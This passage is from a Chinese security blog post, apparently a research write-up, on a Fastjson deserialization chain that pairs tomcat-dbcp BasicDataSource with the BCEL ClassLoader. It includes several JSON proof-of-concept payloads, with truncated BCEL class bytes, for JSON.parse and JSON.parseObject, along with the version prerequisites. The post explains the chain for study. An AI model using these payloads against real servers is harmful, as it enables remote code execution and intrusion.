number">40</span>$<span class="token number">9</span>a$<span class="token class-name">O</span>$b1$<span class="token number">93</span>$d8K$<span class="token number">9</span>a$<span class="token number">9f</span>$<span class="token class-name">T</span>$<span class="token number">8</span>a0$a8$$<span class="token class-name">S</span>$d5G$af$<span class="token number">89</span>$<span class="token number">8</span>cg$a2$df$a0F$r55$f0$<span class="token class-name">O</span>$cbR$<span class="token number">89</span>$g$<span class="token number">86</span>$<span class="token class-name">C</span>$<span class="token class-name">A</span>$<span class="token class-name">A</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h6 id="POC的构造"><a href="#POC的构造" class="headerlink" title="POC的构造"></a>POC的构造</h6><p>这里有一个小trick：我们使用<code>&#123;&#125;</code>来包裹payload，在反序列化的时候会生成一个JSONObject对象，然后再将JSONObject对象放在了key的位置，其在反序列化的时候就会执行key.toString()操作</p>
<p><code>com.alibaba.fastjson.parser.DefaultJSONParser.parseObject</code></p>
<p>（做个小更改，这里的图片有点错误，在这个版本下，已经不能使用这条链子了，需要满足是&lt;=1.2.36）</p>
<p>因为在高版本中已经将其中的key的toString()方法给qia了，就不能够利用了。</p>
<p><img src="image-20220403163941918.png" alt="image-20220403163941918" loading="lazy"></p>
<p>这样构造POC就会成功执行他的getter方法，达到使用parse方法进行反序列化漏洞触发的目的</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#123;</span>
        <span class="token string">"x"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
                <span class="token string">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"</span><span class="token punctuation">,</span>
                <span class="token string">"driverClassLoader"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                    <span class="token string">"@type"</span><span class="token operator">:</span> <span class="token string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
                <span class="token string">"driverClassName"</span><span class="token operator">:</span> <span class="token string">"$$BCEL$$..."</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token operator">:</span> <span class="token string">"x"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>完美的POC:</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#123;</span>
        <span class="token string">"@type"</span><span class="token operator">:</span> <span class="token string">"com.alibaba.fastjson.JSONObject"</span><span class="token punctuation">,</span>
        <span class="token string">"x"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
                <span class="token string">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"</span><span class="token punctuation">,</span>
                <span class="token string">"driverClassLoader"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
                    <span class="token string">"@type"</span><span class="token operator">:</span> <span class="token string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span>
                <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
                <span class="token string">"driverClassName"</span><span class="token operator">:</span> <span class="token string">"$$BCEL$$$l$8b$I$A$..."</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span class="token operator">:</span> <span class="token string">"x"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这都是使用的是<code>JSON.parse</code>进行反序列化的情况，如果使用的是<code>JSON.parseObject</code>进行反序列化的情况，就没有这么麻烦了只需要：</p>
<p>POC：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token punctuation">&#123;</span>
        <span class="token string">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.tomcat.dbcp.dbcp2.BasicDataSource"</span><span class="token punctuation">,</span>
        <span class="token string">"driverClassLoader"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"@type"</span><span class="token operator">:</span> <span class="token string">"com.sun.org.apache.bcel.internal.util.ClassLoader"</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
        <span class="token string">"driverClassName"</span><span class="token operator">:</span> <span class="token string">"$$BCEL$$$l$8b......"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h5><ol>
<li>需要带有<code>tomcat-dbcp</code>的jar包，而且在8.0之后的包的路径是这样的，在之前的包路径是将<code>dbcp2</code>换成<code>dbcp</code></li>
<li>需要有BCEL这个ClassLoader，因为在JDK 8u251之后的版本中没有这个了</li>
<li>对应的JSON版本需要&lt;=1.2.36</li>
</ol>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzAxNTg0ODU4OQ==&mid=2650358489&idx=1&sn=2d1f600da6f01b644544331a844139ae&chksm=83f0273bb487ae2d85984c541adc7a928bdca396aa6ad3c0c349e2ef044558539f2f7075ad1f&mpshare=1&scene=23&srcid=1123yB78GUjwHduKmaU9BGSa&sharer_sharetime=1637650532436&sharer_shareid=18ef5175242004180f2ee4dd9c244e8a#rd">Java动态类加载，当FastJson遇上内网 (qq.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html">BCEL ClassLoader去哪了 | 离别歌 (leavesongs.com)</a></p>
</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="Donate" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me money.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/B01E5F9A0F70645FFD7D980FB6243619.jpg"><img loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/B01E5F9A0F70645FFD7D980FB6243619.jpg" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-alipay-line"></use></svg></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/D4AD9FA7BDA95604D2919F414577B0BA.png"><img loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/D4AD9FA7BDA95604D2919F414577B0BA.png" alt="QQ 支付" title="QQ 支付"></a><div><span style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/E8775427D2C8BC65C9AC73AE4CE5A3D8.jpg"><img loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/E8775427D2C8BC65C9AC73AE4CE5A3D8.jpg" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>RoboTerh</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://roboterh.github.io/2022/04/03/Fastjson%E5%86%85%E7%BD%91%E5%88%A9%E7%94%A8%E9%93%BE/" title="Fastjson内网利用链">https://roboterh.github.io/2022/04/03/Fastjson%E5%86%85%E7%BD%91%E5%88%A9%E7%94%A8%E9%93%BE/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> unless otherwise stated.</li></ul><script>document.addEventListener('copy', function (event) {
  const clipboardData = event.clipboardData || window.clipboardData;
  if (!clipboardData) { return; }
  const text = window.getSelection().toString();
  if (text) {
    event.preventDefault();
    clipboardData.setData('text/plain', text + '\n\nPost author: RoboTerh\nPost link: https://roboterh.github.io/2022/04/03/Fastjson%E5%86%85%E7%BD%91%E5%88%A9%E7%94%A8%E9%93%BE/\nCopyright Notice: All articles in this blog are licensed under CC BY-NC-SA 4.0 unless otherwise stated.');
  }
});</script></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/2022/04/05/ysoserial%E5%88%86%E6%9E%90%E4%B9%8BROME%E9%93%BE/" rel="prev" title="ysoserial分析之ROME链"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">ysoserial分析之ROME链</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/2022/04/01/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E2/" rel="next" title="Fastjson反序列化漏洞2"><span class="post-nav-text">Fastjson反序列化漏洞2</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>要不要和我说些什么？</span><br></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2022 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> RoboTerh</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v5.4.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.7.0</span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></div></body></html>